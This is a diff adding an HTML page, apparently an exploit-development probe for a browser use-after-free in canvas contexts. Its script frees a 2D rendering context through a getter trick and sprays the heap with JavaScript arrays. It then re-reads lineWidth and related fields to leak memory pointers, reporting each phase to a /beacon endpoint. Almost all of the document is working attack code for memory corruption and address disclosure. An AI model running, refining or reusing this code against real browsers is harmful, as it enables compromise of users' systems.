@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V571</title></head>
+<body><pre id="out">V571 — lineWidth diagnostic</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{fetch('/beacon/V571-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now(),{method:'GET',cache:'no-store'}).catch(function(){});}catch(e){}}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+
+/* ===== Pre-allocate result storage ===== */
+var results=new Array(20);
+var ri=0;
+
+/* ===== triggerUAF ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+/* ===== PHASE A: UAF + immediate lineWidth (ZERO allocations between) ===== */
+var outerC=triggerUAF();
+
+/* These reads happen immediately — no beacons, no toString, no GC triggers.
+   All results stored in pre-allocated array. */
+var lwA, mlA, gaA, errA;
+try { lwA=innerCtx.lineWidth; } catch(e){ errA='lw:'+e.message; }
+try { mlA=innerCtx.miterLimit; } catch(e){ errA=(errA||'')+' ml:'+e.message; }
+try { gaA=innerCtx.globalAlpha; } catch(e){ errA=(errA||'')+' ga:'+e.message; }
+
+/* ===== PHASE B: getContextAttributes (known safe, reads inline m_settings) ===== */
+var attrsB, errB;
+try { attrsB=JSON.stringify(innerCtx.getContextAttributes()); } catch(e){ errB=e.message; }
+
+/* ===== Now report ===== */
+say('PHASE-A: lineWidth='+(errA||lwA));
+if(lwA!==undefined){
+  var bits=dblBits(lwA);
+  say('  raw='+hexPair(bits.hi,bits.lo));
+}
+if(mlA!==undefined){
+  var bits=dblBits(mlA);
+  say('  miterLimit='+mlA+' raw='+hexPair(bits.hi,bits.lo));
+}
+if(gaA!==undefined){
+  var bits=dblBits(gaA);
+  say('  globalAlpha='+gaA+' raw='+hexPair(bits.hi,bits.lo));
+}
+say('PHASE-B: attrs='+(errB||attrsB));
+
+bk('A','lw='+(errA||lwA)+',ml='+(errA||mlA)+',ga='+(errA||gaA));
+bk('B','attrs='+(errB||attrsB));
+
+/* ===== PHASE C: Now do butterfly spray and re-read ===== */
+say('PHASE-C: butterfly spray...');
+bk('C','start');
+
+var NFLY=+(P.get('fly')||'200');
+var mSize=NSAVES+1;
+var possibleCaps=[16,21,24,32,42,48,64];
+var targetBytes=[];
+for(var ci=0;ci<possibleCaps.length;ci++){
+  if(possibleCaps[ci]>=mSize) targetBytes.push(possibleCaps[ci]*240);
+}
+
+var flySizes=[];
+var seen={};
+for(var ti=0;ti<targetBytes.length;ti++){
+  var tb=targetBytes[ti];
+  var classes=[3584,3840,4096,4608,5120,5632,6144,7168,7680,8192,9216,10240,11264,12288,15360,16384];
+  for(var si=0;si<classes.length;si++){
+    if(classes[si]>=tb&&classes[si]<=tb*2){
+      var n=Math.floor((classes[si]-8)/8);
+      if(!seen[n]){seen[n]=1;flySizes.push(n);}
+    }
+  }
+}
+if(flySizes.length===0)flySizes=[1023];
+
+var objPool=[];
+var maxFly=Math.max.apply(null,flySizes);
+try{
+  for(var i=0;i<NFLY*maxFly;i++) objPool.push({v:i});
+}catch(e){say('pool-err:'+e.message);}
+
+var flyArrays=[];
+var poolIdx=0;
+for(var si=0;si<flySizes.length;si++){
+  var sz=flySizes[si];
+  var perSize=Math.max(10,Math.floor(NFLY/flySizes.length));
+  for(var i=0;i<perSize;i++){
+    var a=new Array(sz);
+    for(var j=0;j<sz;j++){
+      a[j]=objPool[poolIdx%objPool.length];
+      poolIdx++;
+    }
+    flyArrays.push(a);
+  }
+}
+say('  sprayed '+flyArrays.length+' arrays, poolIdx='+poolIdx);
+bk('CFLY','n='+flyArrays.length);
+
+/* ===== PHASE D: Re-read lineWidth after spray ===== */
+var lwD, mlD, gaD, errD;
+try { lwD=innerCtx.lineWidth; } catch(e){ errD='lw:'+e.message; }
+try { mlD=innerCtx.miterLimit; } catch(e){ errD=(errD||'')+' ml:'+e.message; }
+try { gaD=innerCtx.globalAlpha; } catch(e){ errD=(errD||'')+' ga:'+e.message; }
+
+say('PHASE-D: lineWidth='+(errD||lwD));
+if(lwD!==undefined){
+  var bits=dblBits(lwD);
+  say('  raw='+hexPair(bits.hi,bits.lo));
+  var topWord=bits.hi>>>16;
+  if(topWord===0&&(bits.hi!==0||bits.lo!==0)){
+    say('  !!!! POINTER: '+hexPair(bits.hi,bits.lo)+' !!!!');
+  }
+}
+if(mlD!==undefined){
+  var bits=dblBits(mlD);
+  say('  miterLimit='+mlD+' raw='+hexPair(bits.hi,bits.lo));
+}
+if(gaD!==undefined){
+  var bits=dblBits(gaD);
+  say('  globalAlpha='+gaD+' raw='+hexPair(bits.hi,bits.lo));
+}
+
+bk('D','lw='+(errD||lwD)+',ml='+(errD||mlD)+',ga='+(errD||gaD));
+
+/* ===== PHASE E: toString still works? ===== */
+var tsE, errE;
+try { tsE=innerCtx.toString(); } catch(e){ errE=e.message; }
+say('PHASE-E: toString='+(errE||tsE));
+bk('E','ts='+(errE||tsE));
+
+say('');
+say('V571 complete.');
+bk('DONE','complete');
+</script>
+</body>
+</html>
